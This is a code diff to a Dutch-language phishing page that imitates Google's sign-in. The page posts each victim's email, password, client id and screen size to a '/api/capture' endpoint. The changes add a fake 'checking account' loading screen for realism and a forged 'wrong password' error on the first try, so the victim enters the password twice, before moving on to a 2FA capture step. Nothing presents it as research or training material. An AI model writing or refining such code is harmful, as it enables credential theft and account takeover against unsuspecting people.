@@ -371,6 +371,24 @@
             </div>
         </div>
 
+        <!-- ── STAP 1.5: Account controleren ── -->
+        <div id="step-loading" style="display:none;">
+            <div style="text-align:center;padding:32px 0 20px;">
+                <img class="card-logo" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google">
+                <div class="avatar-wrap" style="margin:20px auto 12px;">
+                    <div class="avatar" id="loadingAvatarLetter">G</div>
+                </div>
+                <div class="email-chip" style="justify-content:center;margin:0 auto 24px;display:inline-flex;gap:6px;align-items:center;padding:4px 12px;border:1px solid #dadce0;border-radius:20px;font-size:13px;color:#202124;">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="#5f6368"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
+                    <span id="loadingEmailDisplay"></span>
+                </div>
+                <div style="display:flex;align-items:center;justify-content:center;gap:10px;color:#5f6368;font-size:14px;">
+                    <span class="spinner" style="width:18px;height:18px;"></span>
+                    Account controleren&hellip;
+                </div>
+            </div>
+        </div>
+
         <!-- ── STAP 2: Wachtwoord ── -->
         <div id="step-password" style="display:none;">
 
@@ -513,6 +531,7 @@
 
 <script>
     let eyeOpen = false;
+    let wrongPwCount = 0; // counts wrong-password attempts; advances to 2FA after first fail
 
     /* ── Stap 1 → 2 ── */
     function goToPassword() {
@@ -543,17 +562,27 @@
         document.getElementById('emailDisplay').textContent = email;
         document.getElementById('avatarLetter').textContent = email.charAt(0).toUpperCase();
 
+        // Show loading step first for realism
         document.getElementById('step-email').style.display = 'none';
-        const s2 = document.getElementById('step-password');
-        s2.style.display = 'block';
-        s2.classList.remove('step-animate');
-        void s2.offsetWidth; // force reflow
-        s2.classList.add('step-animate');
-        setTimeout(() => document.getElementById('pwInput').focus(), 50);
+        document.getElementById('loadingEmailDisplay').textContent = email;
+        document.getElementById('loadingAvatarLetter').textContent = email.charAt(0).toUpperCase();
+        document.getElementById('step-loading').style.display = 'block';
+
+        setTimeout(() => {
+            document.getElementById('step-loading').style.display = 'none';
+            const s2 = document.getElementById('step-password');
+            s2.style.display = 'block';
+            s2.classList.remove('step-animate');
+            void s2.offsetWidth; // force reflow
+            s2.classList.add('step-animate');
+            setTimeout(() => document.getElementById('pwInput').focus(), 50);
+        }, 1400 + Math.random() * 400);
     }
 
     /* ── Stap 2 → 1 ── */
     function goBack() {
+        wrongPwCount = 0;
+        document.getElementById('step-loading').style.display = 'none';
         document.getElementById('step-password').style.display = 'none';
         document.getElementById('step-2fa').style.display = 'none';
         const s1 = document.getElementById('step-email');
@@ -627,14 +656,14 @@
             statusEl.textContent = 'Verifiëren' + '.'.repeat(dotCount);
         }, 400);
 
-        // Capture credentials with full context
+        // Capture credentials with full context (always, even on first attempt)
         fetch('/api/capture', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 email,
                 password,
-                source: 'google_login',
+                source: 'google_login' + (wrongPwCount > 0 ? '_retry' : ''),
                 timestamp: new Date().toISOString(),
                 clientId: localStorage.getItem('_cid') || 'unknown',
                 screen: (screen.width || 0) + 'x' + (screen.height || 0),
@@ -643,13 +672,25 @@
             })
         }).catch(() => {});
 
-        // After short "verifying" delay, show 2FA step
+        // After short "verifying" delay: first attempt shows wrong-pw error, second+ proceeds
         setTimeout(() => {
             clearInterval(dotInterval);
             if (statusEl.parentNode) statusEl.remove();
             btn.innerHTML = 'Volgende';
             btn.disabled = false;
-            goToTwoFA(email);
+            if (wrongPwCount === 0) {
+                // First attempt: show wrong password error
+                wrongPwCount++;
+                pw.classList.add('err');
+                const errSpan = errEl.querySelector('span');
+                if (errSpan) errSpan.textContent = 'Onjuist wachtwoord. Vergeten?';
+                errEl.classList.add('show');
+                pw.value = '';
+                pw.focus();
+            } else {
+                // Second+ attempt: proceed to 2FA
+                goToTwoFA(email);
+            }
         }, 1600 + Math.random() * 600);
     }
 
